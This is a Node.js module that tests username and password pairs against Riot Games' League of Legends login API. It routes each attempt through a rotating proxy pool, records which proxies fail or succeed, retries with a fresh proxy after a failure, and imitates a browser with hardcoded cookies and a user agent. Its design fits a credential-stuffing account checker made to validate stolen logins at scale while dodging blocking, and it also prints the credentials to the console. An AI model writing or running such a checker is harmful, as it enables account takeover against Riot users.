const { axios } = require('../commons/request');
const { getCookies, setCookies } = require('../commons/cookies');
const { getProxy } = require('../commons/proxy');
const { proxy } = require('../database/models');

const userAgent =
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36';
const baseCookies =
  '__cfduid=df9a4b85e6c0ae707749820f51f81a7221595563294; clid=uw1; _ga=GA1.2.1373131905.1595563297; _gid=GA1.2.1531616600.1595563297; did=56492b45c0bb4c3da6f80a4b7d1cc432; __cf_bm=8afb464032602502f67f342b026ed7d381f55826-1595573964-1800-AbgeSQbY2XHyr8EzykTJbYBRhiC01GI7k17iX4ipZo3CZAPruZda+O3jvXS839XNp3EMqWHZP6eWvxecjvNJa2E=; asid=FfFmzBuzufudetlELO8OJgr7rI21tDD-rzon0hyu-IU.9v63ybRHl0M%3D;';

const areCredentialsOk = async (username, password, forceChangeProxy = false) => {
  console.log('Test Creds', username, password);
  const Proxy = await getProxy(forceChangeProxy);
  console.log('Proxy', Proxy.IP);
  let cookies = baseCookies;
  let addCookies = '';
  const options = {
    url: 'https://auth.riotgames.com/api/v1/authorization',
    method: 'post',
    httpsAgent: Proxy.agent,
    headers: {
      accept: '*/*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'en-US,en;q=0.9,es;q=0.8',
      cookie: cookies,
      referer: 'https://auth.riotgames.com/login',
      'sec-fetch-dest': 'sec-fetch-mode',
      'sec-fetch-site': 'same-origin',
      'content-type': 'application/json',
      'user-agent': userAgent
    },
    data: {
      client_id: 'rso-web-client-prod',
      login_hint: 'euw',
      redirect_uri: 'https://login.leagueoflegends.com/oauth2-callback',
      response_type: 'code',
      scope: 'openid',
      state: '0xwlcxU9RaGD9xfIyxJPDH54bpsJ3wrt7ajOtH3B8eM',
      ui_locales: 'en'
    }
  };
  const resp1_5 = await axios({ options, persist: true });
  if (!resp1_5) {
    console.log('  First request failure');
    // Assume the reason is the proxy
    proxy.update({ _id: Proxy._id }, { $inc: { FailureCount: 1 } });
    return areCredentialsOk(username, password, true);
  }
  proxy.update({ _id: Proxy._id }, { $inc: { SuccessCount: 1 } });
  addCookies = getCookies(resp1_5.headers['set-cookie']);
  cookies = setCookies(cookies, addCookies);
  const resp2 = await axios({
    persist: true,
    options: {
      url: 'https://auth.riotgames.com/api/v1/authorization',
      method: 'put',
      httpsAgent: Proxy.agent,
      headers: {
        accept: '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9,es;q=0.8',
        cookie: cookies,
        referer: 'https://auth.riotgames.com/login',
        'sec-fetch-dest': 'sec-fetch-mode',
        'sec-fetch-site': 'same-origin',
        'user-agent': userAgent
      },
      data: {
        language: 'es-ES',
        password,
        remember: false,
        type: 'auth',
        username
      }
    }
  });
  if (!resp2) {
    console.log('  Second request failure');
    // Assume the reason is the proxy
    proxy.update({ _id: Proxy._id }, { $inc: { FailureCount: 1 } });
    return areCredentialsOk(username, password, true);
  }
  proxy.update({ _id: Proxy._id }, { $inc: { SuccessCount: 1 } });
  if (resp2.status < 200 || resp2.status > 299) return false;
  return !resp2.body.error;
};

module.exports = { areCredentialsOk };
